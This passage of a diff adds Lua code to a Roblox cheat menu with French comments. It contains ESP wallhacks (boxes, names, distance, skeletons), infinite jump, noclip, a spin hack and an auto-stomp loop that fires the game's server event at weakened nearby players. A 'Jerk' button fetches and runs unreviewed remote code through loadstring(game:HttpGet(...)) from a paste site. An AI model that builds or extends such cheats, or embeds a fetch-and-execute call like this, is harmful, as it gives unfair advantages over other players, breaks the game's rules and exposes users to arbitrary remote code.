+                    {5, 6}, {6, 7}, {7, 8}, {8, 5}, -- Top
+                    {1, 5}, {2, 6}, {3, 7}, {4, 8}, -- Vertical
+                }
+
+                local lines = boxes3D[player]
+                for i, connection in ipairs(connections) do
+                    local start = Camera:WorldToViewportPoint(corners[connection[1]])
+                    local stop = Camera:WorldToViewportPoint(corners[connection[2]])
+
+                    if start.Z > 0 and stop.Z > 0 then
+                        lines[i].From = Vector2.new(start.X, start.Y)
+                        lines[i].To = Vector2.new(stop.X, stop.Y)
+                        lines[i].Visible = true
+                    else
+                        lines[i].Visible = false
+                    end
+                end
+            else
+                if boxes3D[player] then
+                    for _, line in pairs(boxes3D[player]) do
+                        line:Remove()
+                    end
+                    boxes3D[player] = nil
+                end
+            end
+
+            -- Name ESP
+            if nameEnabled then
+                if not nameTexts[player] then
+                    local nameTag = Drawing.new("Text")
+                    nameTag.Size = 18
+                    nameTag.Center = true
+                    nameTag.Outline = true
+                    nameTag.Color = Color3.fromRGB(255, 255, 255)
+                    nameTexts[player] = nameTag
+                end
+                local screenPos = Camera:WorldToViewportPoint(rootPart.Position)
+                if screenPos.Z > 0 then
+                    nameTexts[player].Text = player.DisplayName
+                    nameTexts[player].Position = Vector2.new(screenPos.X, screenPos.Y - 40)
+                    nameTexts[player].Visible = true
+                else
+                    nameTexts[player].Visible = false
+                end
+            else
+                if nameTexts[player] then
+                    nameTexts[player]:Remove()
+                    nameTexts[player] = nil
+                end
+            end
+
+            -- Distance ESP
+            if distanceEnabled then
+                if not distanceTexts[player] then
+                    local distanceTag = Drawing.new("Text")
+                    distanceTag.Size = 14
+                    distanceTag.Center = true
+                    distanceTag.Outline = true
+                    distanceTag.Color = Color3.fromRGB(255, 255, 255)
+                    distanceTexts[player] = distanceTag
+                end
+                local screenPos = Camera:WorldToViewportPoint(rootPart.Position)
+                if screenPos.Z > 0 then
+                    local distance = math.floor((Camera.CFrame.Position - rootPart.Position).Magnitude)
+                    distanceTexts[player].Text = tostring(distance) .. "m"
+                    distanceTexts[player].Position = Vector2.new(screenPos.X, screenPos.Y + 20)
+                    distanceTexts[player].Visible = true
+                else
+                    distanceTexts[player].Visible = false
+                end
+            else
+                if distanceTexts[player] then
+                    distanceTexts[player]:Remove()
+                    distanceTexts[player] = nil
+                end
+            end
+        end
+    end
+end
+
+-- Nettoyage à la suppression d'un joueur (ESP original)
+Players.PlayerRemoving:Connect(function(player)
+    if highlights[player] then
+        highlights[player]:Destroy()
+        highlights[player] = nil
+    end
+
+    if boxes2D[player] then
+        for _, line in pairs(boxes2D[player]) do
+            line:Remove()
+        end
+        boxes2D[player] = nil
+    end
+
+    if boxes3D[player] then
+        for _, line in pairs(boxes3D[player]) do
+            line:Remove()
+        end
+        boxes3D[player] = nil
+    end
+
+    if nameTexts[player] then
+        nameTexts[player]:Remove()
+        nameTexts[player] = nil
+    end
+
+    if distanceTexts[player] then
+        distanceTexts[player]:Remove()
+        distanceTexts[player] = nil
+    end
+end)
+
+-- Système Skeleton ESP corrigé
+local SkeletonLines = {}
+local SkeletonConnections = {}
+
+local boneConnections = {
+    {"Head", "UpperTorso"},
+    {"UpperTorso", "LowerTorso"},
+    {"UpperTorso", "LeftUpperArm"},
+    {"LeftUpperArm", "LeftLowerArm"},
+    {"LeftLowerArm", "LeftHand"},
+    {"UpperTorso", "RightUpperArm"},
+    {"RightUpperArm", "RightLowerArm"},
+    {"RightLowerArm", "RightHand"},
+    {"LowerTorso", "LeftUpperLeg"},
+    {"LeftUpperLeg", "LeftLowerLeg"},
+    {"LeftLowerLeg", "LeftFoot"},
+    {"LowerTorso", "RightUpperLeg"},
+    {"RightUpperLeg", "RightLowerLeg"},
+    {"RightLowerLeg", "RightFoot"}
+}
+
+function CreateSkeleton(player)
+    if SkeletonLines[player] then 
+        -- Si déjà créé, on nettoie d'abord
+        if SkeletonConnections[player] then
+            SkeletonConnections[player]:Disconnect()
+        end
+        if SkeletonLines[player] then
+            for _, line in ipairs(SkeletonLines[player]) do
+                line:Remove()
+            end
+        end
+    end
+    
+    local lines = {}
+    for i = 1, #boneConnections do
+        lines[i] = Drawing.new("Line")
+        lines[i].Color = skeletonColor
+        lines[i].Thickness = 2
+        lines[i].Visible = false
+    end
+    
+    local connection = run.RenderStepped:Connect(function()
+        UpdateSkeleton(player)
+    end)
+    
+    SkeletonLines[player] = lines
+    SkeletonConnections[player] = connection
+end
+
+function UpdateSkeleton(player)
+    local lines = SkeletonLines[player]
+    if not lines or not skeletonEnabled then return end
+    
+    local character = player.Character
+    if not character then
+        for _, line in ipairs(lines) do
+            line.Visible = false
+        end
+        return
+    end
+    
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid or humanoid.Health <= 0 then
+        for _, line in ipairs(lines) do
+            line.Visible = false
+        end
+        return
+    end
+    
+    for i, bones in ipairs(boneConnections) do
+        local part1 = character:FindFirstChild(bones[1])
+        local part2 = character:FindFirstChild(bones[2])
+        
+        if part1 and part2 then
+            local pos1, vis1 = camera:WorldToViewportPoint(part1.Position)
+            local pos2, vis2 = camera:WorldToViewportPoint(part2.Position)
+            
+            if vis1 and vis2 then
+                lines[i].From = Vector2.new(pos1.X, pos1.Y)
+                lines[i].To = Vector2.new(pos2.X, pos2.Y)
+                lines[i].Visible = true
+            else
+                lines[i].Visible = false
+            end
+        else
+            lines[i].Visible = false
+        end
+    end
+end
+
+function ClearAllSkeletons()
+    for player, connection in pairs(SkeletonConnections) do
+        if connection then
+            connection:Disconnect()
+        end
+    end
+    
+    for player, lines in pairs(SkeletonLines) do
+        if lines then
+            for _, line in ipairs(lines) do
+                if line then
+                    line:Remove()
+                end
+            end
+        end
+    end
+    
+    SkeletonLines = {}
+    SkeletonConnections = {}
+end
+
+function RefreshAllSkeletons()
+    ClearAllSkeletons()
+    if not skeletonEnabled then return end
+    
+    -- Recréer pour tous les joueurs
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer then
+            CreateSkeleton(player)
+        end
+    end
+end
+
+function UpdateAllSkeletonColors()
+    for player, lines in pairs(SkeletonLines) do
+        if lines then
+            for _, line in ipairs(lines) do
+                if line then
+                    line.Color = skeletonColor
+                end
+            end
+        end
+    end
+end
+
+-- 🎯 INITIALISATION AUTOMATIQUE
+-- Démarrer pour tous les joueurs existants
+for _, player in ipairs(game.Players:GetPlayers()) do
+    if player ~= game.Players.LocalPlayer then
+        CreateSkeleton(player)
+    end
+end
+
+-- Gérer les nouveaux joueurs
+game.Players.PlayerAdded:Connect(function(player)
+    if skeletonEnabled then
+        CreateSkeleton(player)
+    end
+end)
+
+-- Gérer les respawns (quand un joueur change de character)
+game.Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        wait(0.5) -- Petit délai pour le chargement
+        if skeletonEnabled then
+            CreateSkeleton(player) -- Recréer le skeleton
+        end
+    end)
+end)
+
+-- Nettoyer quand un joueur quitte
+game.Players.PlayerRemoving:Connect(function(player)
+    if SkeletonConnections[player] then
+        SkeletonConnections[player]:Disconnect()
+        SkeletonConnections[player] = nil
+    end
+    
+    if SkeletonLines[player] then
+        for _, line in ipairs(SkeletonLines[player]) do
+            line:Remove()
+        end
+        SkeletonLines[player] = nil
+    end
+end)
+
+-- Démarrer la boucle ESP original
+RunService.RenderStepped:Connect(updateESP)
+
+-- Section ESP dans VISUAL
+do
+    local ESPSection = Visual:AddSection({
+        Position = 'left',
+        Name = "ESP"
+    })
+    
+    -- Highlight ESP
+    ESPSection:AddToggle({
+        Name = "Highlight ESP",
+        Default = false,
+        Callback = function(state)
+            highlightEnabled = state
+            updateESP()
+        end
+    })
+    
+    -- Color Highlight ESP
+    ESPSection:AddColorPicker({
+        Name = "Highlight Color",
+        Default = HighlightColor,
+        Callback = function(Value)
+            HighlightColor = Value
+            for _, highlight in pairs(highlights) do
+                highlight.FillColor = Value
+            end
+        end
+    })
+
+    -- ESP Box 2D Amélioré
+    ESPSection:AddToggle({
+        Name = "ESP Box 2D",
+        Default = false,
+        Callback = function(Value)
+            espSettings.enabled = Value
+            -- Forcer le masquage si désactivé
+            if not Value then
+                for _, drawings in pairs(espCache) do
+                    drawings.box.Visible = false
+                    drawings.boxoutline.Visible = false
+                end
+            end
+        end
+    })
+    
+    -- Couleur de la box (Box 2D Amélioré)
+    ESPSection:AddColorPicker({
+        Name = "Box Color",
+        Default = espSettings.boxColor,
+        Callback = function(Value)
+            espSettings.boxColor = Value
+            for _, drawings in pairs(espCache) do
+                drawings.box.Color = Value
+            end
+        end
+    })
+    
+    -- Couleur de l'outline (Box 2D Amélioré)
+    ESPSection:AddColorPicker({
+        Name = "Outline Color", 
+        Default = espSettings.boxOutlineColor,
+        Callback = function(Value)
+            espSettings.boxOutlineColor = Value
+            for _, drawings in pairs(espCache) do
+                drawings.boxoutline.Color = Value
+            end
+        end
+    })
+
+    -- Team Check (Box 2D Amélioré)
+    ESPSection:AddToggle({
+        Name = "Team Check",
+        Default = false,
+        Callback = function(Value)
+            espSettings.teamcheck = Value
+        end
+    })
+    
+    -- Team Color (Box 2D Amélioré)
+    ESPSection:AddToggle({
+        Name = "Team Color",
+        Default = true,
+        Callback = function(Value)
+            espSettings.teamcolor = Value
+        end
+    })
+
+    -- Box 3D ESP (Original)
+    ESPSection:AddToggle({
+        Name = "ESP Box 3D",
+        Default = false,
+        Callback = function(state)
+            box3DEnabled = state
+            updateESP()
+        end
+    })
+
+    -- Name ESP
+    ESPSection:AddToggle({
+        Name = "Name ESP",
+        Default = false,
+        Callback = function(state)
+            nameEnabled = state
+            updateESP()
+        end
+    })
+
+    -- Distance ESP
+    ESPSection:AddToggle({
+        Name = "Distance ESP",
+        Default = false,
+        Callback = function(state)
+            distanceEnabled = state
+            updateESP()
+        end
+    })
+
+    ESPSection:AddToggle({
+        Name = "Skeleton ESP",
+        Callback = function(Value)
+            skeletonEnabled = Value
+            if not Value then
+                ClearAllSkeletons()
+            else
+                RefreshAllSkeletons()
+            end
+        end
+    })
+
+    ESPSection:AddColorPicker({
+        Name = "Skeleton Color", 
+        Default = Color3.fromRGB(255, 255, 255),
+        Callback = function(Value)
+            skeletonColor = Value
+            UpdateAllSkeletonColors()
+        end
+    })
+end
+
+
+------------------------------------------------------------------------------
+--//Inf Jump
+local inf_jump_conn1 = nil;
+local inf_jump_conn2 = nil;
+
+local inf_jump_can_jump = true;
+
+function ToggleInfJump(toggle)
+    if toggle then
+        inf_jump_conn1 = uis.JumpRequest:Connect(function()
+            if (hum) and (hum.Health > 0) and (inf_jump_can_jump == true) then
+                hum:ChangeState(Enum.HumanoidStateType.Jumping);
+                inf_jump_can_jump = false;
+            end
+        end)
+        inf_jump_conn2 = uis.InputEnded:Connect(function(input, _)
+            if input.KeyCode == Enum.KeyCode.Space then
+                inf_jump_can_jump = true;
+            end
+        end)
+    else
+        pcall(function()
+            inf_jump_conn1:Disconnect();
+        end)
+        inf_jump_conn1 = nil;
+        pcall(function()
+            inf_jump_conn2:Disconnect();
+        end)
+        inf_jump_conn2 = nil;
+    end
+end
+
+-- Ajout du toggle Inf Jump
+Misc:AddSection({
+    Position = 'left',
+    Name = "MOVEMENT"
+}):AddToggle({
+    Name = "Inf Jump",
+    Callback = function(Value)
+        ToggleInfJump(Value);
+    end    
+})
+
+
+
+------------------------------------------------------------------------------
+
+-- Variables pour le FE Spin
+local feSpinEnabled = false
+local spinSpeed = 5 -- Vitesse de rotation par défaut
+local runService = game:GetService("RunService")
+local player = game.Players.LocalPlayer
+local humanoidRootPart
+
+-- Met à jour le HumanoidRootPart après chaque respawn
+local function updateHRP()
+    local char = player.Character or player.CharacterAdded:Wait()
+    humanoidRootPart = char:WaitForChild("HumanoidRootPart")
+end
+
+-- Initialiser
+updateHRP()
+
+-- Se réabonner au respawn
+player.CharacterAdded:Connect(function()
+    updateHRP()
+end)
+
+-- Section FE SPIN dans LUA
+do
+    local FESpinSection = Lua:AddSection({
+        Position = 'left',
+        Name = "FE SPIN"
+    })
+    
+    FESpinSection:AddToggle({
+        Name = "FE Spin",
+        Callback = function(Value)
+            feSpinEnabled = Value
+        end
+    })
+    
+    FESpinSection:AddSlider({
+        Name = "Spin Speed",
+        Min = 1,
+        Max = 50,
+        Increment = 0.1,
+        Default = 5,
+        Callback = function(Value)
+            spinSpeed = Value
+        end
+    })
+end
+
+-- Spin en continu
+runService.Heartbeat:Connect(function()
+    if feSpinEnabled and humanoidRootPart then
+        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
+    end
+end)
+
+
+
+------------------------------------------------------------------------------
+
+-- Variables
+local autoStomp = false
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Section AUTO-STOMP dans RAGE
+do
+    local AutoStompSection = Rage:AddSection({
+        Position = 'center',
+        Name = "AUTO-STOMP"
+    })
+    
+    AutoStompSection:AddToggle({
+        Name = "Auto-Stomp",
+        Callback = function(Value)
+            autoStomp = Value
+        end
+    })
+end
+
+-- Auto-Stomp Loop
+task.spawn(function()
+    while true do
+        task.wait(0.15)
+        if autoStomp and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            for _, plr in pairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("HumanoidRootPart") then
+                    local hum = plr.Character.Humanoid
+                    local root = plr.Character.HumanoidRootPart
+                    local myRoot = LocalPlayer.Character.HumanoidRootPart
+
+                    if hum.Health < 8 and (myRoot.Position - root.Position).Magnitude < 12 then
+                        -- Stomp sans téléportation
+                        game.ReplicatedStorage.MainEvent:FireServer("Stomp")
+                    end
+                end
+            end
+        end
+    end
+end)
+
+-- Section JERK SCRIPT dans LUA
+do
+    local ScriptSection = Lua:AddSection({
+        Position = 'right',
+        Name = "SCRIPTS"
+    })
+    
+    ScriptSection:AddButton({
+        Name = "⚡ Jerk",
+        Callback = function()
+            loadstring(game:HttpGet(('https://pastefy.app/YZoglOyJ/raw')))()
+        end
+    })
+end
+
+------------------------------------------------------------------------------
+
+-- NO CLIP CORRECT
+local noclipEnabled = false
+local noclipConnection = nil
+local originalCollisions = {}
+
+local function saveOriginalCollisions(character)
+    originalCollisions = {}
+    for _, part in pairs(character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            originalCollisions[part] = part.CanCollide
+        end
+    end
+end
+
+local function restoreCollisions(character)
+    for part, canCollide in pairs(originalCollisions) do
+        if part and part.Parent then
+            part.CanCollide = canCollide
+        end
+    end
+    originalCollisions = {}
+end
+
+local function noclipLoop()
+    if noclipEnabled and game.Players.LocalPlayer.Character then
+        for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end
+end
+
+-- Ajouter dans MISC
+local QOLSection = Misc:AddSection({
+    Position = 'right', 
+    Name = "QUALITY OF LIFE"
+})
+
+QOLSection:AddToggle({
+    Name = "No Clip",
+    Callback = function(Value)
+        noclipEnabled = Value
+        local character = game.Players.LocalPlayer.Character
+        
+        if Value then
+            -- Sauvegarder les collisions originales
+            if character then
+                saveOriginalCollisions(character)
+            end
+            -- Démarrer la boucle No Clip
+            if noclipConnection then
+                noclipConnection:Disconnect()
+            end
+            noclipConnection = game:GetService("RunService").Stepped:Connect(noclipLoop)
+        else
+            -- Arrêter la boucle No Clip
+            if noclipConnection then
+                noclipConnection:Disconnect()
+                noclipConnection = nil
+            end
+            -- Restaurer les collisions originales
+            if character then
+                restoreCollisions(character)
+            end
+        end
+    end
+})
+
+-- Réinitialiser quand le personnage change
+game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
+    if noclipEnabled then
+        wait(1) -- Attendre que le personnage soit complètement chargé
+        saveOriginalCollisions(character)
+    else
+        restoreCollisions(character)
+    end
+end)
+
+
+------------------------------------------------------------------------------
+
+-- FPS BOOST AVEC TEXTURES SIMPLIFIÉES
+local fpsBoostEnabled = false
+local textureBoostEnabled = false
+local originalTextures = {}
+local fpsConnection = nil
+
+local function simplifyTextures()
+    print("🎨 Simplification des textures...")
+    
+    -- Remplacer les textures par des couleurs simples
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("UnionOperation") then
+            -- Sauvegarder la texture originale
+            if not originalTextures[obj] then
+                originalTextures[obj] = {
+                    BrickColor = obj.BrickColor,
+                    Material = obj.Material,
+                    Reflectance = obj.Reflectance
+                }
+            end
+            
+            -- Appliquer des matériaux simples
+            obj.Material = Enum.Material.Plastic
+            obj.Reflectance = 0
+            
+            -- Couleur simple basée sur la couleur originale
+            local originalColor = originalTextures[obj].BrickColor
+            obj.BrickColor = originalColor -- Garde la couleur mais simplifie le matériau
+            
+        elseif obj:IsA("Decal") or obj:IsA("Texture") then
+            -- Sauvegarder les décals
+            if not originalTextures[obj] then
+                originalTextures[obj] = {
+                    Texture = obj.Texture,
+                    Face = obj.Face,
+                    Parent = obj.Parent
+                }
+            end
+            -- Supprimer les textures détaillées
+            obj:Destroy()
+        end
+    end
+    
+    -- Simplifier le terrain
+    if workspace:FindFirstChildOfClass("Terrain") then
+        local terrain = workspace.Terrain
+        terrain.Decoration = false
+        terrain.WaterReflection = false
+        terrain.WaterTransparency = 0.8
+    end
+    
+    print("✅ Textures simplifiées")
+end
+
+local function restoreTextures()
+    print("🎨 Restauration des textures...")
+    
+    for obj, originalData in pairs(originalTextures) do
+        if obj and obj.Parent then
+            if obj:IsA("Part") or obj:IsA("MeshPart") then
+                obj.BrickColor = originalData.BrickColor
+                obj.Material = originalData.Material
+                obj.Reflectance = originalData.Reflectance
+            end
+        end
+    end
+    
+    -- Restaurer le terrain
+    if workspace:FindFirstChildOfClass("Terrain") then
+        local terrain = workspace.Terrain
+        terrain.Decoration = true
+        terrain.WaterReflection = true
+        terrain.WaterTransparency = 0.5
+    end
+    
+    originalTextures = {}
+    print("✅ Textures restaurées")
+end
+
+local function applyFPSBoost()
+    -- Désactiver les ombres (le plus efficace)
+    game:GetService("Lighting").GlobalShadows = false
+    
+    -- Réduire la qualité graphique
+    settings().Rendering.QualityLevel = 1
+    
+    -- Désactiver les effets
+    local lighting = game:GetService("Lighting")
+    for _, effect in pairs(lighting:GetChildren()) do
+        if effect:IsA("PostEffect") then
+            effect.Enabled = false
+        end
+    end
+    
+    -- Simplifier les textures si activé
+    if textureBoostEnabled then
+        simplifyTextures()
+    end
+    
+    -- Boucle de maintenance FPS
+    while fpsBoostEnabled do
+        -- Désactiver les nouvelles particules
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("ParticleEmitter") or obj:IsA("Fire") or obj:IsA("Smoke") then
+                obj.Enabled = false
+            end
+        end
+        wait(2)
+    end
+end
+
+local function restoreFPS()
+    game:GetService("Lighting").GlobalShadows = true
+    settings().Rendering.QualityLevel = 3
+    
+    -- Restaurer les textures si elles étaient modifiées
+    if textureBoostEnabled then
+        restoreTextures()
+    end
+end
+
+-- Section GRAPHICS BOOST
+local GraphicsSection = Misc:AddSection({
+    Position = 'left',
+    Name = "GRAPHICS BOOST"
+})
+
+GraphicsSection:AddToggle({
+    Name = "🚀 FPS Boost",
+    Callback = function(Value)
+        fpsBoostEnabled = Value
+        
+        if Value then
+            if fpsConnection then
+                fpsConnection:Disconnect()
+            end
+            fpsConnection = task.spawn(applyFPSBoost)
+            print("🚀 FPS Boost activé")
+        else
+            if fpsConnection then
+                fpsConnection:Disconnect()
+                fpsConnection = nil
+            end
+            restoreFPS()
+            print("🛑 FPS Boost désactivé")
+        end
+    end
+})
+
+GraphicsSection:AddToggle({
+    Name = "🎨 Simplify Textures",
+    Callback = function(Value)
+        textureBoostEnabled = Value
+        
+        if Value and fpsBoostEnabled then
+            simplifyTextures()
+        elseif not Value then
+            restoreTextures()
+        end
+    end
+})
+
+GraphicsSection:AddButton({
+    Name = "🔄 Refresh Textures",
+    Callback = function()
+        if textureBoostEnabled and fpsBoostEnabled then
+            simplifyTextures()
+        end
+    end
+})
+
+------------------------------------------------------------------------------
+
+
+------------------------------------------------------------------------------
+--// EMOTE PLAYER 
+------------------------------------------------------------------------------
+
+local EmoteSection = Lua:AddSection({
+    Position = 'center',
+    Name = "EMOTE PLAYER"
+})
+
+-- Variables pour l'emote player
+local CurrentTrack = nil
+local EmoteSettings = {
+    StopOnMove = true,
+    FadeIn = 0.1,
+    FadeOut = 0.1,
+    Weight = 1,
+    Speed = 1,
+    AllowInvisible = true,
+    TimePosition = 0
+}
+
+-- Stocker l'ID de l'emote
+local CurrentEmoteId = ""
+
+-- Fonction pour extraire l'ID (corrigée)
+local function extractIdFromInput(input)
+    if not input or input == "" then
+        return nil
+    end
+    
+    -- Si c'est déjà un nombre
+    local num = tonumber(input)
+    if num then 
+        return num 
+    end
+    
+    -- Nettoyer l'input
+    input = tostring(input):gsub(" ", "")
+    
+    -- Patterns pour différents formats d'URL
+    local patterns = {
+        "rbxassetid://(%d+)",
+        "catalog/(%d+)",
+        "library/(%d+)", 
+        "asset/%?id=(%d+)",
+        "(%d+)"  -- Juste les chiffres à la fin
+    }
+    
+    for _, pattern in ipairs(patterns) do
+        local match = string.match(input, pattern)
+        if match then 
+            local id = tonumber(match)
+            if id and id > 0 then
+                return id
+            end
+        end
+    end
+    
+    -- Essayer de trouver des chiffres dans l'input
+    local digits = string.match(input, "(%d+)")
+    if digits then
+        local id = tonumber(digits)
+        if id and id > 0 then
+            return id
+        end
+    end
+    
+    return nil
+end
+
+-- Fonction pour actualiser les paramètres de l'emote en cours
+local function UpdateEmoteSettings()
+    if CurrentTrack and CurrentTrack.IsPlaying then
+        -- Actualiser la vitesse
+        pcall(function()
+            CurrentTrack:AdjustSpeed(EmoteSettings.Speed)
+        end)
+        
+        -- Actualiser le poids
+        local weight = EmoteSettings.Weight
+        if weight == 0 then weight = 0.001 end
+        pcall(function()
+            CurrentTrack:AdjustWeight(weight)
+        end)
+        
+        -- Actualiser la position temporelle
+        if CurrentTrack.Length > 0 then
+            pcall(function()
+                CurrentTrack.TimePosition = math.clamp(EmoteSettings.TimePosition, 0, 1) * CurrentTrack.Length
+            end)
+        end
+    end
+end
+
+-- Fonction pour charger une emote (corrigée)
+local function LoadTrack(id)
+    -- Arrêter l'emote actuelle
+    if CurrentTrack then 
+        CurrentTrack:Stop(EmoteSettings.FadeOut) 
+        CurrentTrack = nil
+        wait(0.1) -- Petit délai
+    end
+
+    local player = game.Players.LocalPlayer
+    local character = player.Character
+    if not character then
+        Ruii:CreateNotifier():Notify({
+            Title = "Emote Player",
+            Content = "No character found!",
+            Icon = "alert-triangle"
+        })
+        return nil
+    end
+    
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then
+        Ruii:CreateNotifier():Notify({
+            Title = "Emote Player",
+            Content = "No humanoid found!",
+            Icon = "alert-triangle"
+        })
+        return nil
+    end
+
+    -- Charger l'animation
+    local success, result = pcall(function()
+        return game:GetObjects("rbxassetid://" .. tostring(id))
+    end)
+
+    local animId
+    if success and result and #result > 0 then
+        local anim = result[1]
+        if anim:IsA("Animation") then
+            animId = anim.AnimationId
+        else
+            animId = "rbxassetid://" .. tostring(id)
+        end
+    else
+        animId = "rbxassetid://" .. tostring(id)
+    end
+
+    -- Créer et charger la piste d'animation
+    local newAnim = Instance.new("Animation")
+    newAnim.AnimationId = animId
+    
+    local trackSuccess, newTrack = pcall(function()
+        return humanoid:LoadAnimation(newAnim)
+    end)
+    
+    if not trackSuccess or not newTrack then
+        Ruii:CreateNotifier():Notify({
+            Title = "Emote Player",
+            Content = "Failed to load animation!",
+            Icon = "alert-triangle"
+        })
+        return nil
+    end
+
+    newTrack.Priority = Enum.AnimationPriority.Action4
+
+    local weight = EmoteSettings.Weight
+    if weight == 0 then weight = 0.001 end
+
+    -- Jouer l'animation
+    local playSuccess = pcall(function()
+        newTrack:Play(EmoteSettings.FadeIn, weight, EmoteSettings.Speed)
+    end)
+    
+    if not playSuccess then
+        Ruii:CreateNotifier():Notify({
+            Title = "Emote Player",
+            Content = "Failed to play animation!",
+            Icon = "alert-triangle"
+        })
+        return nil
+    end
+    
+    CurrentTrack = newTrack
+    
+    -- Position temporelle
+    if EmoteSettings.TimePosition > 0 and CurrentTrack.Length > 0 then
+        CurrentTrack.TimePosition = math.clamp(EmoteSettings.TimePosition, 0, 1) * CurrentTrack.Length
+    end
+
+    Ruii:CreateNotifier():Notify({
+        Title = "Emote Player",
+        Content = "Emote loaded successfully! ID: " .. tostring(id),
+        Icon = "check"
+    })
+    
+    return newTrack
+end
+
+-- Fonction pour arrêter l'emote
+local function StopTrack()
+    if CurrentTrack then
+        pcall(function()
+            CurrentTrack:Stop(EmoteSettings.FadeOut)
+        end)
+        CurrentTrack = nil
+        return true
+    end
+    return false
+end
+
+-- Gestion des collisions pour l'invisibilité
+local originalCollisionStates = {}
+local collisionConnection = nil
+
+local function saveCollisionStates(character)
+    if not character then return end
+    originalCollisionStates = {}
+    for _, part in ipairs(character:GetDescendants()) do
+        if part:IsA("BasePart") and part ~= character.PrimaryPart then
+            originalCollisionStates[part] = part.CanCollide
+        end
+    end
+end
+
+local function disableCollisionsExceptRootPart(character)
+    if not EmoteSettings.AllowInvisible or not character then return end
+    
+    for _, part in ipairs(character:GetDescendants()) do
+        if part:IsA("BasePart") and part ~= character.PrimaryPart then
+            part.CanCollide = false
+        end
+    end
+end
+
+local function restoreCollisionStates()
+    for part, canCollide in pairs(originalCollisionStates) do
+        if part and part.Parent then
+            pcall(function()
+                part.CanCollide = canCollide
+            end)
+        end
+    end
+    originalCollisionStates = {}
+end
+
+-- Setup des collisions
+game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
+    restoreCollisionStates()
+    if collisionConnection then
+        collisionConnection:Disconnect()
+        collisionConnection = nil
+    end
+end)
+
+-- Interface Ruii pour l'emote player
+local emoteIdInput = EmoteSection:AddTextBox({
+    Name = "Emote ID/URL",
+    Default = "",
+    Placeholder = "Enter emote ID or URL...",
+    Callback = function(Value)
+        CurrentEmoteId = Value
+        print("Emote ID set to:", Value) -- Debug
+    end
+})
+
+-- Boutons Play/Stop
+EmoteSection:AddButton({
+    Name = "▶ Play Emote",
+    Callback = function()
+        if CurrentEmoteId == "" then
+            Ruii:CreateNotifier():Notify({
+                Title = "Emote Player",
+                Content = "Please enter an emote ID first!",
+                Icon = "alert-triangle"
+            })
+            return
+        end
+        
+        print("Trying to load emote:", CurrentEmoteId) -- Debug
+        
+        local id = extractIdFromInput(CurrentEmoteId)
+        if id then
+            print("Extracted ID:", id) -- Debug
+            CurrentTrack = LoadTrack(id)
+            
+            if CurrentTrack then
+                -- Sauvegarder les collisions si AllowInvisible est activé
+                local character = game.Players.LocalPlayer.Character
+                if character and EmoteSettings.AllowInvisible then
+                    saveCollisionStates(character)
+                end
+            end
+        else
+            Ruii:CreateNotifier():Notify({
+                Title = "Emote Player",
+                Content = "Invalid emote ID: " .. CurrentEmoteId,
+                Icon = "alert-triangle"
+            })
+            print("Failed to extract ID from:", CurrentEmoteId) -- Debug
+        end
+    end
+})
+
+EmoteSection:AddButton({
+    Name = "■ Stop Emote", 
+    Callback = function()
+        if StopTrack() then
+            restoreCollisionStates()
+            Ruii:CreateNotifier():Notify({
+                Title = "Emote Player",
+                Content = "Emote stopped!",
+                Icon = "stop"
+            })
+        else
+            Ruii:CreateNotifier():Notify({
+                Title = "Emote Player",
+                Content = "No emote playing!",
+                Icon = "info"
+            })
+        end
+    end
+})
+
+-- NOUVEAU : Bouton pour actualiser les paramètres
+EmoteSection:AddButton({
+    Name = "🔄 Update Settings",
+    Callback = function()
+        UpdateEmoteSettings()
+        Ruii:CreateNotifier():Notify({
+            Title = "Emote Player",
+            Content = "Settings updated!",
+            Icon = "refresh-cw"
+        })
+    end
+})
+
+-- Test avec des émotes populaires
+EmoteSection:AddButton({
+    Name = "🎭 Test avec emote populaire",
+    Callback = function()
+        -- ID d'une emote populaire (Floss)
+        CurrentEmoteId = "5917459365"
+        emoteIdInput:Set("5917459365")
+        
+        Ruii:CreateNotifier():Notify({
+            Title = "Emote Player",
+            Content = "Test emote loaded (Floss)",
+            Icon = "play"
+        })
+    end
+})
+
+-- Sliders pour les réglages (MAINTENANT ils s'actualisent automatiquement)
+EmoteSection:AddSlider({
+    Name = "Fade In Time",
+    Min = 0,
+    Max = 2,
+    Increment = 0.1,
+    Default = 0.1,
+    Callback = function(Value)
+        EmoteSettings.FadeIn = Value
+        -- Le fade in s'applique au prochain play
+    end
+})
+
+EmoteSection:AddSlider({
+    Name = "Fade Out Time", 
+    Min = 0,
+    Max = 2,
+    Increment = 0.1,
+    Default = 0.1,
+    Callback = function(Value)
+        EmoteSettings.FadeOut = Value
+        -- Le fade out s'applique au prochain stop
+    end
+})
+
+EmoteSection:AddSlider({
+    Name = "Emote Weight",
+    Min = 0,
+    Max = 1,
+    Round = 2,
+    Default = 1,
+    Callback = function(Value)
+        EmoteSettings.Weight = Value
+        -- ACTUALISATION AUTOMATIQUE
+        if CurrentTrack then
+            local weight = Value
+            if weight == 0 then weight = 0.001 end
+            pcall(function()
+                CurrentTrack:AdjustWeight(weight)
+            end)
+        end
+    end
+})
+
+EmoteSection:AddSlider({
+    Name = "Emote Speed",
+    Min = 0,
+    Max = 5,
+    Round = 2,
+    Default = 1,
+    Callback = function(Value)
+        EmoteSettings.Speed = Value
+        -- ACTUALISATION AUTOMATIQUE
+        if CurrentTrack then
+            pcall(function()
+                CurrentTrack:AdjustSpeed(Value)
+            end)
+        end
+    end
+})
+
+EmoteSection:AddSlider({
+    Name = "Time Position",
+    Min = 0,
+    Max = 1,
+    Round = 2,
+    Default = 0,
